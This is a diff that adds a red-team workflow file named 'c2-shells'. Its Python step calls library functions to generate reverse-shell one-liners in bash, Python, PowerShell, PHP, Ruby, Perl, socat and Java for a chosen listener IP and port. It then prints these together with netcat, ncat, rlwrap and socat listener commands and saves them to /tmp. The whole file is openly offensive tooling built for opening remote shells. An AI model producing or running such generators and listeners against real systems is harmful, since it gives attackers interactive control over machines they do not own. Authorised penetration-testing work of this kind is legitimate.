@@ -1,0 +1,99 @@
+name: c2-shells
+description: |
+  C2 reverse shell generator — generate reverse shell one-liners
+  for multiple languages using the ofx.api.c2 module.
+tags: [redteam, c2, reverse-shell, exploit]
+dispatch:
+  inputs:
+    lhost:
+      required: true
+      type: string
+      description: Listener IP address
+    lport:
+      type: string
+      default: "4444"
+      description: Listener port
+    shell_types:
+      type: string
+      default: "bash,python,powershell,php,ruby,perl,socat,java"
+      description: "Comma-separated shell types: bash,python,powershell,php,ruby,perl,socat,java"
+
+jobs:
+  generate:
+    name: Generate Reverse Shells
+    outputs:
+      shells_file: "{{ steps.build-shells.outputs.shells_file }}"
+      shell_count: "{{ steps.build-shells.outputs.shell_count }}"
+    steps:
+    - name: build-shells
+      timeout: 3
+      continue-on-error: true
+      script: |
+        from ofx.api.c2 import (
+            bash_reverse_shell,
+            python_reverse_shell,
+            powershell_reverse_shell,
+            php_reverse_shell,
+            ruby_reverse_shell,
+            perl_reverse_shell,
+            socat_reverse_shell,
+            java_reverse_shell,
+            ncat_listener,
+            rlwrap_listener,
+        )
+
+        lhost = "{{ inputs.lhost }}"
+        lport = int("{{ inputs.lport }}")
+        requested = [s.strip().lower() for s in "{{ inputs.shell_types }}".split(",") if s.strip()]
+
+        generators = {
+            "bash": lambda: bash_reverse_shell(lhost, lport),
+            "python": lambda: python_reverse_shell(lhost, lport),
+            "powershell": lambda: powershell_reverse_shell(lhost, lport),
+            "php": lambda: php_reverse_shell(lhost, lport),
+            "ruby": lambda: ruby_reverse_shell(lhost, lport),
+            "perl": lambda: perl_reverse_shell(lhost, lport),
+            "socat": lambda: socat_reverse_shell(lhost, lport),
+            "java": lambda: java_reverse_shell(lhost, lport),
+        }
+
+        shells = {}
+        for stype in requested:
+            if stype in generators:
+                shells[stype] = generators[stype]()
+            else:
+                print(f"[!] Unknown shell type: {stype}")
+                print(f"    Available: {', '.join(generators.keys())}")
+
+        # Display all generated shells
+        print(f"{'='*60}")
+        print(f" REVERSE SHELLS ({lhost}:{lport})")
+        print(f"{'='*60}")
+        for name, cmd in shells.items():
+            print(f"\n--- {name} ---")
+            print(cmd)
+
+        # Listener commands
+        print(f"\n{'='*60}")
+        print(" LISTENERS")
+        print(f"{'='*60}")
+        print(f"  nc:     nc -lvnp {lport}")
+        print(f"  ncat:   {ncat_listener(lport)}")
+        print(f"  rlwrap: {rlwrap_listener(lport)}")
+        print(f"  socat:  socat file:`tty`,raw,echo=0 tcp-listen:{lport}")
+
+        # Save to file
+        out_file = "/tmp/ofx_c2_shells.txt"
+        with open(out_file, "w") as f:
+            f.write(f"# Reverse Shells - {lhost}:{lport}\n\n")
+            for name, cmd in shells.items():
+                f.write(f"### {name} ###\n{cmd}\n\n")
+            f.write("### Listeners ###\n")
+            f.write(f"nc -lvnp {lport}\n")
+            f.write(f"{ncat_listener(lport)}\n")
+            f.write(f"{rlwrap_listener(lport)}\n")
+
+        with open("{{ env.OFX_OUTPUTS }}", "a") as f:
+            f.write(f"shells_file={out_file}\n")
+            f.write(f"shell_count={len(shells)}\n")
+      log-stdout: true
